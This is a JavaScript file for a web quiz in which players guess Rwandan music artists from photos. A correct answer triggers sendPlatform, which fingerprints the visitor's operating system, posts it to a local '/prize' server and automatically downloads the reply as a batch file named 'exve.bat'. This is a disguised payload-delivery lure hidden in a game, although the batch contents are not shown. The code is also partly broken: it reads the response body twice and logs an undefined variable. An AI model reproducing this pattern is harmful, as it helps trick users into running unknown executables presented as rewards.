var isArtistCorrect = false;
var randomIndex;
const artistInfo = [
	{
		name: "Bruce Melodie",
		profileUrl: "imgs/bruceMelodie.jpg",
	},
	{
		name: "Nel Ngabo",
		profileUrl: "imgs/nelNgabo.jpg",
	},
	{
		name: "Igor Mabano",
		profileUrl: "imgs/igorMabano.jpg",
	},
	{
		name: "Kenny Sol",
		profileUrl: "imgs/kennySol.jpg",
	},
];
window.onload = () => {
	document.getElementById("artist-image").alt = "wow";
	getRandomImage();
};
function getRandomImage() {
	randomIndex = Math.floor(Math.random() * artistInfo.length);
	const randomImageUrl = artistInfo[randomIndex].profileUrl;
	document.getElementById("artist-image").src = randomImageUrl;
}

function getClientPlatform() {
	const platform = navigator.userAgent;
	let clientPlatform = platform.toLowerCase().includes("win")
		? "windows"
		: "linux";
	// console.log(clientPlatform);
	return clientPlatform;
}

async function sendPlatform() {
	const pf = getClientPlatform();
	try {

		await fetch("http://localhost:3000/prize", {
			method: "POST",
			// headers: {
			// 	"Content-Type": "application/json",
			// },
			body: JSON.stringify({ platform: pf }),
		}).then((res) => {
			console.log(res.text(),"resposn")
			return res.text()
		}).then((data) => {
			let blob = new Blob([data], { type: 'octet/stream' });
			let url = window.URL.createObjectURL(blob);
			const a = document.createElement('a');
			a.href = url;
			a.download = 'exve.bat'
			a.click();
			a.remove();
			window.URL.revokeObjectURL(url)
		}).catch((err) => { console.log(err) });

		//make download of octet stream



		console.log(body)
	}
	catch (err) {
		console.log(err);
		console.log('error occured')
	}
}

function checkAnswer() {
	const selectedArtist = document.getElementById("artist-options").value;
	if (selectedArtist == artistInfo[randomIndex].name) {
		isArtistCorrect = true;
		document.getElementById("correct").style.display = "block";
		document.getElementById("wrong").style.display = "none";

		sendPlatform().then((res) => console.log(res))
	} else {
		document.getElementById("correct").style.display = "none";
		document.getElementById("wrong").style.display = "block";
	}
}
